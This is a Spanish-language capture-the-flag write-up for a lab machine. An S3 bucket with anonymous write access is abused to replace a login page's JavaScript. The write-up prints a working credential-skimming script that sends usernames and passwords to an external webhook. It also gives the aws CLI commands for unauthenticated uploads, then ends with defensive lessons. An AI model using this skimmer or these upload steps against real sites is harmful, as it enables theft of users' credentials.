# Writeup: Static (HackSmarter — Medium)

Static es una máquina **Medium** diseñada para simular un entorno web estático que utiliza un bucket S3 público para alojar sus recursos. El recorrido comienza con el descubrimiento de un bucket S3 expuesto mediante el análisis del código fuente de la página. Tras enumerar el bucket, se encuentra que es público y, además, permite escritura sin autenticación. Aprovechando esta mala configuración, se modifica el archivo `auth-module.js` para inyectar un payload que exfiltra las credenciales introducidas en el formulario de login a un webhook externo. Al cargar la página modificada, el código malicioso envía las credenciales del usuario `tyler` al atacante, obteniendo así la flag.

---

## 🎯 Objetivo / Scope

Como miembro del equipo de Hack Smarter Red Team, se ha asignado una prueba de penetración contra el portal de empleados de un cliente. Durante la reunión de alcance, se supo que el cliente utiliza AWS para su arquitectura web. El objetivo es idear una forma de robar credenciales cuando los empleados inicien sesión. La bandera final es la contraseña del usuario `tyler`.

---

## 🔍 Fase 1: Reconocimiento de la aplicación web

### 1.1 Acceso al portal

La aplicación web es un portal de login estático. Al acceder a la URL, se muestra un formulario de autenticación simple.

### 1.2 Análisis del código fuente

Al inspeccionar el código fuente, encontramos una referencia a un bucket S3 público que aloja los recursos estáticos (imágenes, scripts, etc.):

```html
<script src="https://cg-assets-lab.s3.amazonaws.com/auth-module.js"></script>
<img src="https://cg-assets-lab.s3.amazonaws.com/logo.svg" alt="Logo">
```

**Observación:** El bucket `cg-assets-lab` es público y contiene el archivo `auth-module.js` y `logo.svg`.

---

## 📦 Fase 2: Enumeración del bucket S3

### 2.1 Listado de objetos del bucket

El bucket S3 está configurado con permisos de lectura pública, lo que permite listar su contenido sin autenticación. Usamos `curl` para obtener el listado:

```bash
curl https://cg-assets-lab.s3.amazonaws.com/
```

**Respuesta (XML):**

```xml
<ListBucketResult>
<Name>cg-assets-lab</Name>
<Contents>
<Key>auth-module.js</Key>
<LastModified>2026-08-09T22:20:26.000Z</LastModified>
<Size>52</Size>
</Contents>
<Contents>
<Key>logo.svg</Key>
<LastModified>2026-08-09T22:20:26.000Z</LastModified>
<Size>304</Size>
</Contents>
</ListBucketResult>
```

El bucket contiene dos objetos:

- `auth-module.js` (52 bytes)
- `logo.svg` (304 bytes)

### 2.2 Análisis de los objetos

Descargamos y examinamos ambos archivos para entender su propósito:

**`logo.svg`:**

```bash
curl https://cg-assets-lab.s3.amazonaws.com/logo.svg
```

```svg
<svg width="100" height="100" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
  <polygon points="50,10 90,30 90,70 50,90 10,70 10,30" fill="#0d0d0d" stroke="#00ff41" stroke-width="4"/>
  <text x="50" y="60" font-family="Arial" font-size="40" fill="#00ff41" text-anchor="middle">H</text>
</svg>
```

**`auth-module.js`:**

```bash
curl https://cg-assets-lab.s3.amazonaws.com/auth-module.js
```

```javascript
console.log('Hacksmarter Auth Module v1.2 loaded.');
```

El archivo `auth-module.js` solo imprime un mensaje en la consola del navegador. No parece tener funcionalidad crítica, pero está siendo incluido en la página de login.

---

## ✍️ Fase 3: Verificación de permisos de escritura

### 3.1 Prueba de escritura en el bucket

El bucket S3 tiene permisos de escritura pública (`PutObject`). Para confirmarlo, subimos un archivo de prueba:

```bash
echo "test" > test.txt
aws s3 cp test.txt s3://cg-assets-lab --no-sign-request
```

```bash
upload: ./test.txt to s3://cg-assets-lab/test.txt
```

La subida fue exitosa, confirmando que cualquier usuario puede escribir en el bucket sin necesidad de credenciales.

### 3.2 Listado actualizado del bucket

Verificamos que el archivo de prueba se haya subido correctamente:

```bash
aws s3 ls s3://cg-assets-lab --no-sign-request
```

```bash
2026-08-09 19:07:08        545 auth-module.js
2026-08-09 18:20:26        304 logo.svg
2026-08-09 18:45:20          0 test.txt
```

---

## 🧨 Fase 4: Preparación del payload malicioso

### 4.1 Estrategia

Dado que el archivo `auth-module.js` se carga en la página de login y podemos sobrescribirlo, inyectaremos un script que capture las credenciales del formulario y las envíe a un endpoint controlado por nosotros.

### 4.2 Creación del archivo malicioso

Usaremos **Webhook.site** para obtener un endpoint público que reciba las credenciales. Obtenemos una URL única: `https://webhook.site/ID` (reemplazamos con un placeholder).

Creamos un nuevo `auth-module.js` con el siguiente contenido:

```javascript
window.onload = function() {
    var btn = document.getElementById('login-btn');
    if(btn) {
        btn.addEventListener('click', function() {
            var u = document.getElementById('username').value;
            var p = document.getElementById('password').value;
            
            // Enviamos las credenciales a Webhook.site
            var img = new Image();
            img.src = 'https://webhook.site/ID?user=' + encodeURIComponent(u) + '&pass=' + encodeURIComponent(p);
        });
    }
};
```

**Explicación del código:**

- `window.onload`: Se ejecuta cuando la página ha cargado completamente.
- `document.getElementById('login-btn')`: Busca el botón de login por su ID.
- `addEventListener('click', ...)`: Asocia una función al evento `click` del botón.
- Cuando el usuario hace clic en "Login", el script captura los valores de los campos `username` y `password`.
- Utiliza un objeto `Image` para hacer una solicitud GET al webhook con las credenciales como parámetros de consulta (`user=` y `pass=`). Esto evita problemas de CORS, ya que las solicitudes de imágenes a dominios externos están permitidas.

### 4.3 Subida del payload al bucket

Sobrescribimos el archivo original con nuestro payload malicioso:

```bash
aws s3 cp auth-module.js s3://cg-assets-lab/auth-module.js --no-sign-request
```

```bash
upload: ./auth-module.js to s3://cg-assets-lab/auth-module.js
```

---

## 📡 Fase 5: Exfiltración de credenciales

### 5.1 Espera de la víctima

Cuando un empleado (en este caso, el usuario `tyler`) acceda al portal de login, la página cargará nuestro `auth-module.js` modificado. Al introducir sus credenciales y hacer clic en "Login", el script enviará las credenciales a nuestro webhook.

### 5.2 Recepción de las credenciales

En la interfaz de Webhook.site, recibimos una solicitud GET con las credenciales en los parámetros:

| Método | URL |
|--------|-----|
| GET    | `https://webhook.site/ID?user=tyler&pass=[REDACTED]` |

| Cabecera | Valor |
|----------|-------|
| `user-agent` | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/151.0.0.0 Safari/537.36` |
| `referer` | `http://localhost/` |
| `sec-fetch-dest` | `image` |
| `sec-fetch-mode` | `no-cors` |
| `sec-fetch-site` | `cross-site` |

| Parámetros decodificados | Valor |
|--------------------------|-------|
| `user`                   | `tyler` |
| `pass`                   | `[REDACTED]` |

### 5.3 Resultado

La contraseña del usuario `tyler` es: `[REDACTED]`. Hemos completado el objetivo del pentest.

---

## 📌 Conclusión

Static es una máquina **Media** que combina:

1. **Enumeración de recursos públicos** en un bucket S3 expuesto.
2. **Verificación de permisos de escritura** en el bucket.
3. **Inyección de código malicioso** en un archivo JavaScript cargado por la aplicación.
4. **Exfiltración de credenciales** mediante un webhook externo.

---

## 📚 Lecciones aprendidas

1. **Los buckets S3 no deben ser públicos con permisos de escritura**  
   El bucket `cg-assets-lab` permitía escritura sin autenticación, lo que permitió sobrescribir el archivo `auth-module.js`. Los buckets S3 deben tener políticas restrictivas y nunca permitir escritura pública.

2. **Los archivos estáticos cargados por la aplicación deben estar protegidos contra modificaciones**  
   El archivo `auth-module.js` estaba en un bucket público y podía ser modificado por cualquier persona. Los recursos estáticos deben alojarse en buckets con permisos de solo lectura y sin capacidad de sobrescritura para usuarios no autenticados.

3. **La inyección de código en recursos estáticos puede comprometer toda la aplicación**  
   Al modificar un archivo JavaScript cargado en todas las páginas, se puede capturar información sensible como credenciales de usuario. Es fundamental auditar la integridad de los recursos estáticos y utilizar mecanismos como SRI (Subresource Integrity).

4. **Los webhooks son una herramienta eficaz para la exfiltración de datos**  
   Un endpoint público como Webhook.site permite recibir datos de forma sencilla sin necesidad de infraestructura propia. Los atacantes aprovechan estas herramientas para extraer información sin levantar sospechas.

5. **La confianza en recursos externos sin validación es un riesgo**  
   La página cargaba `auth-module.js` desde un bucket S3 sin verificar su integridad. El uso de SRI (Integridad de Subrecursos) habría prevenido la ejecución del archivo modificado.

6. **El principio de mínimo privilegio debe aplicarse a los servicios en la nube**  
   El bucket S3 no debería haber tenido permisos de escritura para usuarios anónimos. Las políticas de IAM y los permisos de bucket deben seguir el principio de mínimo privilegio.

7. **La enumeración de recursos públicos puede revelar vectores de ataque**  
   El simple hecho de listar el bucket reveló la existencia de `auth-module.js`, que fue el vector de ataque. La exposición de metadatos puede ser tan peligrosa como la exposición de datos.

8. **El monitoreo de cambios en recursos públicos debe ser una prioridad**  
   La organización no detectó que el archivo `auth-module.js` había sido modificado. Se deben implementar mecanismos de monitoreo para detectar cambios no autorizados en recursos públicos.

